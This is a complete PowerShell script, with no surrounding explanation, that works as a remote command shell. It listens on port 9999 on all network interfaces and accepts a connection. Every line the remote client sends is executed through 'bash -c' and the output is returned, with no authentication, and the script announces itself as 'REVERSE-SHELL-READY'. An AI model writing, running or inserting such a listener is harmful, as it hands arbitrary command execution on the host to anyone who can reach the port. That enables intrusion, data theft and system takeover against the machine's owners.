$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 9999)
$listener.Start()
Write-Host "Listening on 0.0.0.0:9999..."
try {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = [System.IO.StreamReader]::new($stream)
    $writer = [System.IO.StreamWriter]::new($stream)
    $writer.AutoFlush = $true
    
    Write-Host "Client connected!"
    
    # Send a command prompt
    $writer.WriteLine("echo REVERSE-SHELL-READY")
    
    while ($true) {
        $line = $reader.ReadLine()
        if ($line -eq "exit") { break }
        Write-Host ">> $line"
        
        # Execute command and capture output
        $result = bash -c "$line" 2>&1
        $output = $result -join "`n"
        if ([string]::IsNullOrEmpty($output)) { $output = "(no output)" }
        
        $writer.WriteLine($output)
        $writer.WriteLine("CMD-DONE")
    }
}
finally {
    $client?.Close()
    $listener.Stop()
}
